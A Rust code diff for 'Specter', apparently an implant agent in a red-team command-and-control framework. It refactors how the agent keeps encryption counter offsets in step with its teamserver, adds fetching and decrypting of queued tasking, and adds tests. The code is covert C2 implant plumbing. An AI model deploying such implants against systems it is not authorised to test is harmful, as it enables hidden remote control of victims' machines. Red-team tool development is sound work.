@@ -1,9 +1,10 @@
 //! Core agent logic: init handshake and callback loop.
 
 use red_cell_common::crypto::{
-    AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
+    AgentCryptoMaterial, decrypt_agent_data_at_offset, derive_session_keys,
+    generate_agent_crypto_material,
 };
-use red_cell_common::demon::DemonCommand;
+use red_cell_common::demon::{DemonCommand, DemonMessage};
 use tracing::{info, warn};
 
 use crate::config::SpecterConfig;
@@ -91,8 +92,8 @@ impl SpecterAgent {
 
     /// Perform the DEMON_INIT handshake with the teamserver.
     ///
-    /// Sends the init packet and validates the acknowledgement.  On success,
-    /// the CTR counters are advanced past the init exchange.
+    /// Sends the init packet and validates the acknowledgement. On success,
+    /// the local CTR state is synchronised with the shared teamserver offset.
     pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
         let metadata = self.collect_metadata();
         let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
@@ -102,15 +103,7 @@ impl SpecterAgent {
         let response = self.transport.send(&packet).await?;
         let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
 
-        // After init, the server encrypted the ACK at offset 0 and advanced by ack_blocks.
-        // We decrypted at offset 0 and must advance our recv counter to match.
-        self.recv_ctr_offset = ack_blocks;
-        // The teamserver uses decrypt_agent_data (CTR always at 0) for DEMON_INIT and
-        // inserts the agent with ctr_block_offset = 0.  It then advances by exactly 1 block
-        // when building the init ACK (4-byte payload → 1 block).  So after init the server's
-        // stored CTR = ack_blocks (= 1).  Our send counter must match that same value so
-        // the first callback is encrypted at the offset the server expects.
-        self.send_ctr_offset = self.recv_ctr_offset;
+        self.sync_ctr_offsets(ack_blocks);
 
         info!(
             agent_id = format_args!("0x{:08X}", self.agent_id),
@@ -124,33 +117,23 @@ impl SpecterAgent {
 
     /// Send a `COMMAND_CHECKIN` callback to the teamserver.
     pub async fn checkin(&mut self) -> Result<Vec<u8>, SpecterError> {
-        let command_id = u32::from(DemonCommand::CommandCheckin);
-        let request_id = 0_u32;
-
-        let packet = build_callback_packet(
-            self.agent_id,
-            &self.session_crypto,
-            self.send_ctr_offset,
-            command_id,
-            request_id,
-            &[], // empty payload for a simple checkin
-        )?;
-
-        let response = self.transport.send(&packet).await?;
-
-        // Advance send CTR by the encrypted payload length
-        // The encrypted payload is the entire envelope payload (command_id + request_id + len + data)
-        let encrypted_len = 4 + 4 + 4; // command_id + request_id + payload_len (0 bytes payload)
-        self.send_ctr_offset += ctr_blocks_for_len(encrypted_len);
+        let response = self.send_callback(DemonCommand::CommandCheckin, 0, &[]).await?;
         let tasking = parse_tasking_response(
             self.agent_id,
             &self.session_crypto,
             self.recv_ctr_offset,
             &response,
         )?;
-        self.recv_ctr_offset = tasking.next_recv_ctr_offset;
+        self.sync_ctr_offsets(tasking.next_recv_ctr_offset);
 
         Ok(tasking.decrypted)
+    }
+
+    /// Request queued tasking from the teamserver.
+    pub async fn get_job(&mut self) -> Result<DemonMessage, SpecterError> {
+        let response = self.send_callback(DemonCommand::CommandGetJob, 0, &[]).await?;
+        let message = self.decrypt_job_message(&response)?;
+        Ok(message)
     }
 
     /// Run the main agent loop: init, then checkin repeatedly.
@@ -198,6 +181,69 @@ impl SpecterAgent {
     pub fn agent_id(&self) -> u32 {
         self.agent_id
     }
+
+    /// Return the current send-side CTR block offset.
+    #[must_use]
+    pub fn send_ctr_offset(&self) -> u64 {
+        self.send_ctr_offset
+    }
+
+    /// Return the current receive-side CTR block offset.
+    #[must_use]
+    pub fn recv_ctr_offset(&self) -> u64 {
+        self.recv_ctr_offset
+    }
+
+    async fn send_callback(
+        &mut self,
+        command: DemonCommand,
+        request_id: u32,
+        payload: &[u8],
+    ) -> Result<Vec<u8>, SpecterError> {
+        let packet = build_callback_packet(
+            self.agent_id,
+            &self.session_crypto,
+            self.send_ctr_offset,
+            u32::from(command),
+            request_id,
+            payload,
+        )?;
+        let response = self.transport.send(&packet).await?;
+        self.sync_ctr_offsets(self.send_ctr_offset + ctr_blocks_for_len(4 + payload.len()));
+        Ok(response)
+    }
+
+    fn decrypt_job_message(&mut self, response: &[u8]) -> Result<DemonMessage, SpecterError> {
+        if response.is_empty() {
+            return Ok(DemonMessage::default());
+        }
+
+        let message = DemonMessage::from_bytes(response)?;
+        let mut next_recv_ctr_offset = self.recv_ctr_offset;
+        let mut packages = Vec::with_capacity(message.packages.len());
+
+        for mut package in message.packages {
+            if !package.payload.is_empty() {
+                let encrypted_len = package.payload.len();
+                package.payload = decrypt_agent_data_at_offset(
+                    &self.session_crypto.key,
+                    &self.session_crypto.iv,
+                    next_recv_ctr_offset,
+                    &package.payload,
+                )?;
+                next_recv_ctr_offset += ctr_blocks_for_len(encrypted_len);
+            }
+            packages.push(package);
+        }
+
+        self.sync_ctr_offsets(next_recv_ctr_offset);
+        Ok(DemonMessage::new(packages))
+    }
+
+    fn sync_ctr_offsets(&mut self, offset: u64) {
+        self.send_ctr_offset = offset;
+        self.recv_ctr_offset = offset;
+    }
 }
 
 /// Get the hostname of the current machine.
@@ -237,6 +283,7 @@ fn os_build() -> u32 {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use red_cell_common::demon::DemonPackage;
 
     #[test]
     fn agent_creation_succeeds() {
@@ -344,5 +391,55 @@ mod tests {
             assert!(delay > 0);
             assert!(delay <= 15000);
         }
+    }
+
+    #[test]
+    fn ctr_accessors_reflect_current_offsets() {
+        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
+        agent.sync_ctr_offsets(7);
+
+        assert_eq!(agent.send_ctr_offset(), 7);
+        assert_eq!(agent.recv_ctr_offset(), 7);
+    }
+
+    #[test]
+    fn decrypt_job_message_decrypts_payloads_and_advances_recv_ctr() {
+        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
+        agent.sync_ctr_offsets(3);
+
+        let first_plaintext = vec![0xAA, 0xBB, 0xCC];
+        let second_plaintext = vec![0x10; 17];
+        let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            agent.recv_ctr_offset,
+            &first_plaintext,
+        )
+        .expect("encrypt first payload");
+        let second_offset = agent.recv_ctr_offset + ctr_blocks_for_len(first_plaintext.len());
+        let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            second_offset,
+            &second_plaintext,
+        )
+        .expect("encrypt second payload");
+
+        let response = DemonMessage::new(vec![
+            DemonPackage::new(DemonCommand::CommandSleep, 1, first_payload),
+            DemonPackage::new(DemonCommand::CommandCheckin, 2, Vec::new()),
+            DemonPackage::new(DemonCommand::CommandOutput, 3, second_payload),
+        ])
+        .to_bytes()
+        .expect("serialize job response");
+
+        let message = agent.decrypt_job_message(&response).expect("decrypt job response");
+
+        assert_eq!(message.packages.len(), 3);
+        assert_eq!(message.packages[0].payload, first_plaintext);
+        assert!(message.packages[1].payload.is_empty());
+        assert_eq!(message.packages[2].payload, second_plaintext);
+        assert_eq!(agent.recv_ctr_offset(), 3 + ctr_blocks_for_len(3) + ctr_blocks_for_len(17));
+        assert_eq!(agent.send_ctr_offset(), agent.recv_ctr_offset());
     }
 }
